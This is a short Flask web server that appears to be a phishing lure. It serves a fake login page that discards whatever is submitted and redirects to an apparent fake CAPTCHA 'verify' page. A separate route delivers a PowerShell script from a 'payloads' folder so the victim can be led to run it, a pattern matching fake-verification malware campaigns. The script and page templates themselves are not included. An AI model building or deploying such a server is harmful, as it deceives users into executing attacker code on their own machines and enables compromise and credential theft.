from flask import Flask, redirect, send_file, request, Response
import os
import time

app = Flask(__name__)
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

@app.route("/")
def home():
    return redirect("/login")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        time.sleep(3)
        return redirect("/login/verify")
    return send_file(os.path.join(BASE_DIR, "templates", "login.html"))

@app.route("/login/verify")
def captcha():
    return send_file(os.path.join(BASE_DIR, "templates", "verify.html"))

@app.route("/verify/script")
def verify_script():
    ps_path = os.path.join(BASE_DIR, "payloads", "verify.ps1")
    try:
        with open(ps_path, "r") as f:
            script = f.read()
        return Response(script, mimetype="text/plain")
    except FileNotFoundError:
        return Response("Script not found.", status=404)

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=8000)

